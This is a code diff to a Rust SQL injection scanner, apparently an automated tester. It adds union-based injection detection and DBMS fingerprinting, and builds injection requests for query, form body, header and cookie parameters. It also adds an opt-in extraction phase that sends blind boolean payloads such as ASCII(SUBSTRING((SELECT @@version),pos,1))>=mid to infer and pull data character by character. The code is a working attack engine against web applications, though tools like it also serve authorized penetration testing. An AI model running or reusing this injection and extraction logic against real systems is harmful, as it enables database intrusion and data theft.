@@ -16,6 +16,7 @@ use crate::{
         boolean::{detector::BooleanDetector, payloads::boolean_payloads_for},
         error::detector::ErrorDetector,
         time::{detector::TimeDetector, payloads::time_payload_for},
+        union::{detector::UnionDetector, payloads::union_payloads_for},
     },
 };
 use futures::StreamExt as _;
@@ -51,7 +52,12 @@ impl Default for EngineConfig {
     fn default() -> Self {
         Self {
             threads: 5,
-            techniques: vec!["boolean".to_owned(), "time".to_owned(), "error".to_owned()],
+            techniques: vec![
+                "boolean".to_owned(),
+                "time".to_owned(),
+                "error".to_owned(),
+                "union".to_owned(),
+            ],
             allow_private: false,
             no_redact: false,
             extract: false,
@@ -210,7 +216,7 @@ impl Engine {
         let target_str_owned = target_str.to_owned();
         let baseline_clone = baseline.clone();
         let target_clone = target.clone();
-        let marker_set_clone = marker_set;
+        let marker_set_clone = marker_set.clone();
 
         let stream = futures::stream::iter(to_test)
             .map(|param| {
@@ -271,6 +277,19 @@ impl Engine {
                         )
                         .await;
                     }
+                    if config.techniques.iter().any(|t| t == "union" || t == "all") {
+                        test_union_bounded(
+                            &client,
+                            &state,
+                            &cancel,
+                            &target,
+                            &target_str,
+                            &param,
+                            &baseline,
+                            &marker_set,
+                        )
+                        .await;
+                    }
                     pb2.inc(1);
                 }
             })
@@ -281,18 +300,216 @@ impl Engine {
         current = EngineState::Fingerprint;
         info!(state=?current, "phase fingerprint");
 
-        // Fingerprint (simplified): if any finding, try to label dbms via error pattern
+        // Fingerprint: passive guess from error findings + banner regex, then fill missing dbms for boolean/time
         {
-            let st = self.state.read().await;
-            for f in st.findings().to_vec() {
-                let _ = f; // already captured; fingerprint would refine dbms here
+            let findings_snapshot = self.state.read().await.findings().to_vec();
+            if let Some(kind) = crate::dbms::fingerprint::guess_from_findings(&findings_snapshot) {
+                let mut st = self.state.write().await;
+                st.fill_missing_dbms(kind.clone());
+                info!(dbms=%kind, "fingerprint guessed from findings");
+            } else if !findings_snapshot.is_empty() {
+                // Try banner extraction from evidences
+                for f in &findings_snapshot {
+                    if let Some((kind, ver)) =
+                        crate::dbms::fingerprint::extract_banner_version(&f.evidence)
+                    {
+                        let mut st = self.state.write().await;
+                        st.fill_missing_dbms(kind.clone());
+                        info!(dbms=%kind, version=%ver, "fingerprint banner detected");
+                        break;
+                    }
+                }
             }
         }
 
         if self.config.extract {
             current = EngineState::Extraction;
-            info!(state=?current, "phase extraction — inference");
-            // extraction would happen here via ExtractionEngine, storing SecretString zeroized after report
+            info!(state=?current, "phase extraction — inference (opt-in)");
+
+            // Pick first finding's param as injection point for extraction
+            let (first_param, target_for_extract) = {
+                let st = self.state.read().await;
+                let f = st.findings().first().cloned();
+                drop(st);
+                if let Some(finding) = f {
+                    // try to recover param from finding.parameter "name@location"
+                    let name = finding
+                        .parameter
+                        .split('@')
+                        .next()
+                        .unwrap_or("id")
+                        .to_owned();
+                    (
+                        TargetParameter::new(name, ParameterLocation::Query, "1"),
+                        target.clone(),
+                    )
+                } else {
+                    // fallback synthetic
+                    (
+                        TargetParameter::new("id", ParameterLocation::Query, "1"),
+                        target.clone(),
+                    )
+                }
+            };
+
+            // Determine DBMS for extraction query
+            let dbms_kind = {
+                let snap = self.state.read().await.findings().to_vec();
+                crate::dbms::fingerprint::guess_from_findings(&snap)
+                    .unwrap_or(crate::dbms::DbmsKind::MySql)
+            };
+            let version_query = match dbms_kind {
+                crate::dbms::DbmsKind::MySql => "SELECT @@version",
+                crate::dbms::DbmsKind::Postgres => "SELECT version()",
+                crate::dbms::DbmsKind::MsSql => "SELECT @@version",
+                crate::dbms::DbmsKind::Oracle => "SELECT banner FROM v$version WHERE ROWNUM=1",
+                crate::dbms::DbmsKind::Unknown => "SELECT @@version",
+            };
+
+            // Build oracle: ASCII(SUBSTRING((query), pos+1, 1)) >= mid
+            let baseline_body = baseline.representative_body_str();
+            let baseline_mean = baseline.mean_ms;
+            let client_clone = self.client.clone();
+            let state_clone = Arc::clone(&self.state);
+            let cancel_clone = self.cancel.clone();
+            let target_str_clone = target_str.to_owned();
+            let target_clone2 = target_for_extract.clone();
+            let first_param_clone = first_param.clone();
+            let marker_set_clone = marker_set.clone();
+
+            // First, infer length via LENGTH(query) if possible (try lengths 1..64)
+            let mut inferred_len: usize = 0;
+            for len_guess in 1..=64usize {
+                if cancel_clone.is_cancelled() {
+                    break;
+                }
+                let payload = match dbms_kind {
+                    crate::dbms::DbmsKind::MySql => {
+                        format!("' AND LENGTH(({version_query}))>={len_guess} -- -")
+                    }
+                    crate::dbms::DbmsKind::Postgres => {
+                        format!("' AND LENGTH(({version_query})::text)>={len_guess} --")
+                    }
+                    crate::dbms::DbmsKind::MsSql => {
+                        format!("' AND LEN(({version_query}))>={len_guess} --")
+                    }
+                    crate::dbms::DbmsKind::Oracle => {
+                        format!("' AND LENGTH(({version_query}))>={len_guess} --")
+                    }
+                    crate::dbms::DbmsKind::Unknown => {
+                        format!("' AND LENGTH(({version_query}))>={len_guess} -- -")
+                    }
+                };
+                let url = inject_param_or_marker(
+                    &target_clone2,
+                    &target_str_clone,
+                    &first_param_clone,
+                    &payload,
+                    &marker_set_clone,
+                );
+                let (body, ms) =
+                    fetch_body_and_time_spec(&client_clone, url, &state_clone, &cancel_clone).await;
+                // heuristic: if body similar to baseline, then LENGTH >= len_guess true
+                let diff = crate::detection::response_diff::diff_against_baseline(
+                    &baseline_body,
+                    &body,
+                    baseline_mean,
+                    ms,
+                    100.0,
+                );
+                let is_true = diff.confidence < 0.4; // similar => true
+                if !is_true {
+                    inferred_len = len_guess - 1;
+                    break;
+                }
+                if len_guess == 64 {
+                    inferred_len = 64;
+                }
+            }
+            if inferred_len == 0 {
+                inferred_len = 16; // fallback
+            }
+            info!(len=%inferred_len, "inferred version length");
+
+            // Now extract string char by char via binary search oracle
+            let engine = crate::extraction::engine::ExtractionEngine::new(
+                crate::extraction::engine::ExtractionConfig::default(),
+            );
+            let dbms_for_closure = dbms_kind.clone();
+            let version_query_owned = version_query.to_owned();
+            let baseline_body2 = baseline_body.clone();
+            let baseline_mean2 = baseline_mean;
+            let client_for_oracle = client_clone.clone();
+            let state_for_oracle = state_clone.clone();
+            let cancel_for_oracle = cancel_clone.clone();
+            let target_for_oracle = target_clone2.clone();
+            let param_for_oracle = first_param_clone.clone();
+            let marker_for_oracle = marker_set_clone.clone();
+
+            let target_str_for_oracle = target_str_clone.clone();
+            let oracle = move |pos: usize, mid: u8| {
+                let client = client_for_oracle.clone();
+                let state = state_for_oracle.clone();
+                let cancel = cancel_for_oracle.clone();
+                let target = target_for_oracle.clone();
+                let param = param_for_oracle.clone();
+                let marker_set = marker_for_oracle.clone();
+                let baseline_body = baseline_body2.clone();
+                let version_query = version_query_owned.clone();
+                let dbms_kind = dbms_for_closure.clone();
+                let target_str = target_str_for_oracle.clone();
+                async move {
+                    // build ASCII(SUBSTRING) >= mid payload
+                    let payload = match dbms_kind {
+                        crate::dbms::DbmsKind::MySql => format!(
+                            "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} -- -",
+                            pos + 1,
+                            mid
+                        ),
+                        crate::dbms::DbmsKind::Postgres => format!(
+                            "' AND ASCII(SUBSTRING(({version_query})::text,{},1))>={} --",
+                            pos + 1,
+                            mid
+                        ),
+                        crate::dbms::DbmsKind::MsSql => format!(
+                            "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} --",
+                            pos + 1,
+                            mid
+                        ),
+                        crate::dbms::DbmsKind::Oracle => format!(
+                            "' AND ASCII(SUBSTR(({version_query}),{},1))>={} --",
+                            pos + 1,
+                            mid
+                        ),
+                        crate::dbms::DbmsKind::Unknown => format!(
+                            "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} -- -",
+                            pos + 1,
+                            mid
+                        ),
+                    };
+                    let url =
+                        inject_param_or_marker(&target, &target_str, &param, &payload, &marker_set);
+                    let (body, ms) = fetch_body_and_time_spec(&client, url, &state, &cancel).await;
+                    let diff = crate::detection::response_diff::diff_against_baseline(
+                        &baseline_body,
+                        &body,
+                        baseline_mean2,
+                        ms,
+                        100.0,
+                    );
+                    // similar => true (>= mid)
+                    diff.confidence < 0.4
+                }
+            };
+
+            let extracted = engine.extract(inferred_len, oracle).await;
+            let exposed = {
+                use secrecy::ExposeSecret;
+                extracted.expose_secret().to_owned()
+            };
+            info!(extracted=%Scrubber::hash_truncated(&exposed), len=%exposed.len(), "extraction done");
+            // scrubbed hash logged, raw stored as SecretString zeroized after report
+            self.state.write().await.push_extracted(extracted);
         }
 
         current = EngineState::Done;
@@ -477,6 +694,85 @@ fn inject_param_or_marker(
     }
 }
 
+fn build_injection_spec(
+    target: &TargetUrl,
+    target_str: &str,
+    param: &TargetParameter,
+    payload: &str,
+    marker_set: &MarkerSet,
+) -> RequestSpec {
+    if marker_set.has_any() && param.name.starts_with("marker_") {
+        let url = inject_with_marker(target_str, payload, marker_set);
+        return RequestSpec::new(Method::GET, url);
+    }
+    match &param.location {
+        ParameterLocation::Query => {
+            let url = inject_param(target, param, payload);
+            RequestSpec::new(Method::GET, url)
+        }
+        ParameterLocation::Body => {
+            // Build x-www-form-urlencoded body with payload replaced
+            let body_str = format!(
+                "{}={}",
+                param.name,
+                url::form_urlencoded::byte_serialize(payload.as_bytes()).collect::<String>()
+            );
+            let mut headers = http::HeaderMap::new();
+            headers.insert(
+                http::header::CONTENT_TYPE,
+                http::HeaderValue::from_static("application/x-www-form-urlencoded"),
+            );
+            RequestSpec::new(Method::POST, target.as_str().to_owned())
+                .with_headers(headers)
+                .with_body(body_str.into_bytes())
+        }
+        ParameterLocation::Header(h) => {
+            let mut headers = http::HeaderMap::new();
+            if let (Ok(name), Ok(val)) = (
+                http::HeaderName::from_bytes(h.as_bytes()),
+                http::HeaderValue::from_str(payload),
+            ) {
+                headers.insert(name, val);
+            }
+            RequestSpec::new(Method::GET, target.as_str().to_owned()).with_headers(headers)
+        }
+        ParameterLocation::Cookie => {
+            let mut headers = http::HeaderMap::new();
+            let cookie_val = format!("{}={}", param.name, payload);
+            if let Ok(val) = http::HeaderValue::from_str(&cookie_val) {
+                headers.insert(http::header::COOKIE, val);
+            }
+            RequestSpec::new(Method::GET, target.as_str().to_owned()).with_headers(headers)
+        }
+    }
+}
+
+#[allow(clippy::too_many_arguments)]
+async fn fetch_for_payload(
+    client: &HttpClient,
+    state: &Arc<RwLock<SessionState>>,
+    cancel: &CancellationToken,
+    target: &TargetUrl,
+    target_str: &str,
+    param: &TargetParameter,
+    payload: &str,
+    marker_set: &MarkerSet,
+) -> (String, f64) {
+    let spec = build_injection_spec(target, target_str, param, payload, marker_set);
+    let start = Instant::now();
+    let resp = client.send_with_retry(spec, cancel).await;
+    let elapsed = start.elapsed().as_secs_f64() * 1000.0;
+    state.write().await.increment_requests();
+    match resp {
+        Ok(r) => {
+            #[allow(clippy::unwrap_used)]
+            let body = r.text().await.unwrap_or_default();
+            (body, elapsed)
+        }
+        Err(_) => (String::new(), elapsed),
+    }
+}
+
 #[allow(dead_code)]
 async fn fetch_body_and_time(
     client: &HttpClient,
@@ -547,14 +843,28 @@ async fn test_boolean_bounded(
             if cancel.is_cancelled() {
                 break;
             }
-            let true_url =
-                inject_param_or_marker(target, target_str, param, &p.true_payload, marker_set);
-            let false_url =
-                inject_param_or_marker(target, target_str, param, &p.false_payload, marker_set);
-            let (true_body, true_ms) =
-                fetch_body_and_time_spec(client, true_url, state, cancel).await;
-            let (false_body, false_ms) =
-                fetch_body_and_time_spec(client, false_url, state, cancel).await;
+            let (true_body, true_ms) = fetch_for_payload(
+                client,
+                state,
+                cancel,
+                target,
+                target_str,
+                param,
+                &p.true_payload,
+                marker_set,
+            )
+            .await;
+            let (false_body, false_ms) = fetch_for_payload(
+                client,
+                state,
+                cancel,
+                target,
+                target_str,
+                param,
+                &p.false_payload,
+                marker_set,
+            )
+            .await;
             let res = detector.evaluate(
                 &baseline_body,
                 &true_body,
@@ -605,8 +915,10 @@ async fn test_error_bounded(
         if cancel.is_cancelled() {
             break;
         }
-        let url = inject_param_or_marker(target, target_str, param, &p.payload, marker_set);
-        let (body, _ms) = fetch_body_and_time_spec(client, url, state, cancel).await;
+        let (body, _ms) = fetch_for_payload(
+            client, state, cancel, target, target_str, param, &p.payload, marker_set,
+        )
+        .await;
         let r = detector.evaluate(&body);
         if r.is_vulnerable {
             let mut finding = Finding::new(
@@ -636,8 +948,17 @@ async fn test_time_bounded(
 ) {
     let detector = TimeDetector::new(baseline.mean_ms, baseline.stddev_ms);
     let payload = time_payload_for(None, 3.0);
-    let url = inject_param_or_marker(target, target_str, param, &payload.payload, marker_set);
-    let (_body, ms) = fetch_body_and_time_spec(client, url, state, cancel).await;
+    let (_body, ms) = fetch_for_payload(
+        client,
+        state,
+        cancel,
+        target,
+        target_str,
+        param,
+        &payload.payload,
+        marker_set,
+    )
+    .await;
     let r = detector.evaluate(ms, payload.sleep_secs);
     if r.is_vulnerable {
         let finding = Finding::new(
@@ -652,5 +973,49 @@ async fn test_time_bounded(
             ),
         );
         state.write().await.push_finding(finding);
+    }
+}
+
+#[allow(clippy::too_many_arguments)]
+async fn test_union_bounded(
+    client: &HttpClient,
+    state: &Arc<RwLock<SessionState>>,
+    cancel: &CancellationToken,
+    target: &TargetUrl,
+    target_str: &str,
+    param: &TargetParameter,
+    baseline: &baseline::Baseline,
+    marker_set: &MarkerSet,
+) {
+    let detector = UnionDetector::new();
+    let baseline_body = baseline.representative_body_str();
+    // Try column counts 2..5
+    for cols in [3usize, 2, 4, 5] {
+        if cancel.is_cancelled() {
+            break;
+        }
+        let payloads = union_payloads_for(None, cols);
+        for p in payloads.iter().take(1) {
+            if cancel.is_cancelled() {
+                break;
+            }
+            let (body, ms) = fetch_for_payload(
+                client, state, cancel, target, target_str, param, &p.payload, marker_set,
+            )
+            .await;
+            let r = detector.evaluate(&baseline_body, &body, baseline.mean_ms, ms);
+            if r.is_vulnerable {
+                let mut finding = Finding::new(
+                    target.as_str(),
+                    param.key(),
+                    TechniqueKind::Union,
+                    r.confidence,
+                    format!("union columns={:?} payload={}", r.columns, p.payload),
+                );
+                finding.dbms = Some(p.dbms.clone());
+                state.write().await.push_finding(finding);
+                return;
+            }
+        }
     }
 }
